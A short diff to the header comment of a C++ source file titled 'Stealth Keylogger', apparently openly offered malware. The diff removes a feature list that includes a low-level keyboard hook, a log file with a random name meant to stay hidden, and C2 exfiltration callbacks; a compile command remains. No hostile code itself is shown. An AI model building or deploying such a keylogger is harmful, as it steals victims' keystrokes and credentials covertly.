@@ -2,16 +2,7 @@
  * Stealth Keylogger
  *
  * Copyright (c) 2025 - 28zaakypro@proton.me
- * 
- * Features:
- *   - Low-level keyboard hook (WH_KEYBOARD_LL)
- *   - Mouse right-click detection for buffer flush
- *   - Unicode character support (accents, symbols)
- *   - Automatic window tracking with timestamps
- *   - Thread-safe buffer management
- *   - File logging with stealth random filename
- *   - Callback support for C2 exfiltration
- * 
+ *
  * Compile: g++ -o keylogger.exe main.cpp -mwindows -static
  */
 
